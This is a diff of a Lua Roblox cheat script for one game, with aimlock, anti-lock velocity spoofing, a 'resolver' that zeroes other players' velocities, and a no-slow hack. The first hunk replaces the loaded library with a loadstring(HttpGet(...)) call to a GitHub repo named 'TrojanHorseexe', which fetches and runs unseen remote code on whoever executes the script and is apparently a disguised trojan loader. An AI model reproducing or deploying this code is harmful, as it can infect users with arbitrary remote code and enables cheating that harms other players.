@@ -1,6 +1,6 @@
 if getgenv().Obfuscater == true then
 if game.PlaceId == 2788229376 then
-loadstring(game:HttpGet('https://raw.githubusercontent.com/Anti-Lock-Resolver/lib/main/MainLib'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/TrojanHorseexe/www/main/dawd'))()
 -- [Aim Tab UI] ------------------------------------------------------------------------------------------------------------------------------------------------------------
 local AimTab = library:AddTab("Aim"); 
 local AimColoum = AimTab:AddColumn();
@@ -16,8 +16,8 @@ local NotifyLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/vKh
         rewrittenmain = {
         Enabled = true,
         Key = "q",
-        DOT = true,
-        AIRSHOT = true,
+        DOT = false,
+        AIRSHOT = false,
         NOTIF = true,
         AUTOPRED = true,
         FOV = math.huge,
@@ -451,9 +451,6 @@ for i,v in pairs(getconnections(game.Players.LocalPlayer.Idled)) do
 end
 end})
 PlayerMain4:AddButton({text = "Anti-Lock (n)", callback = function()
-getgenv().Y = 60
-getgenv().X = -35
-getgenv().Z = -35
 
 local Toggled = false
 local KeyCode = 'n'
@@ -475,7 +472,7 @@ function AA1()
 game:GetService("RunService").heartbeat:Connect(function()
     if Toggled == true then
     local vel = game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity
-    game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(getgenv().X, getgenv().Y, getgenv().Z)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(-35, 60, -35)
     game:GetService("RunService").RenderStepped:Wait()
     game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = vel
     end
@@ -508,22 +505,13 @@ game:GetService('UserInputService').InputBegan:Connect(function(Key)
 end)
 end})
 
-PlayerMain4:AddBox({text = "Anti Vectores", skipflag = true, callback = function(antis)
-getgenv().Y = antis getgenv().X = antis getgenv().Z = antis
-end});
-
-PlayerMain4:AddButton({text = "Anti-Lock Resolver", callback = function()
-    pcall(function()
-    wait(0.4)
-
-    game.StarterGui:SetCore("SendNotification", {
-        Title = "Anti-Lock Resolver";
-        Text = "Fucked every anti-lock known to scripters, have fun";
-        Duration = 6;
-        Button1 = "TY!"
-    })
-end)
-local RunService = game:GetService("RunService")
+PlayerMain4:AddToggle{text = "Resolver", flag = "ResolverpEnabled",callback = function(res)
+    getgenv().resolver = true
+    if res == false then
+    getgenv().resolver = false
+elseif res == true then
+    getgenv().resolver = true
+    local RunService = game:GetService("RunService")
 
 RunService.Heartbeat:Connect(function()
     pcall(function()
@@ -531,12 +519,12 @@ RunService.Heartbeat:Connect(function()
             if v.Name ~= game.Players.LocalPlayer.Name then
                 local hrp = v.Character.HumanoidRootPart
                 hrp.Velocity = Vector3.new(0, 0, 0)
-                --hrp.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
             end
         end
     end)
 end)
-end})
+end
+end}
 
 PlayerMain4:AddToggle{text = "Anti-Stomp", flag = "AntiStompEnabled",callback = function(x)
      if x == true then
@@ -627,15 +615,19 @@ chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Positio
 end})
 
 PlayerMain5:AddButton({text = "No Slow", callback = function()
-local mt = getrawmetatable(game)
-local backup
-backup = hookfunction(mt.__newindex, newcclosure(function(self, key, value)
-if key == "WalkSpeed" and value < 16 then
-value = 16
-end
-return backup(self, key, value)
-end))
+        game:GetService('RunService'):BindToRenderStep("Anti-Slow", 0 , function()
+            if game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("NoWalkSpeed") then game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("NoWalkSpeed"):Destroy() end
+            if game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("ReduceWalk") then game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("ReduceWalk"):Destroy() end
+            if game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("NoJumping") then game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("NoJumping"):Destroy() end
+            if game.Players.LocalPlayer.Character.BodyEffects.Reload.Value == true then game.Players.LocalPlayer.Character.BodyEffects.Reload.Value = false end
+        end)
 end})
+
+
+
+
+
+--    game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId, game.JobId, game.Players.LocalPlayer)
 
 -- [Visuals Tab UI] ------------------------------------------------------------------------------------------------------------------------------------------------------------
 local VisualsTab = library:AddTab("Visuals"); 
@@ -1077,7 +1069,7 @@ end})
 local MiscMain2 = MiscColunm1:AddSection("Targeting")
 MiscMain2:AddDivider("Targeting")
 
-MiscMain2:AddBox({text = "Targets Name", skipflag = true, callback = function(value)
+MiscMain2:AddBox({text = "Targets Name (Full Name)", skipflag = true, callback = function(value)
 getgenv().Names = value
 end});
 
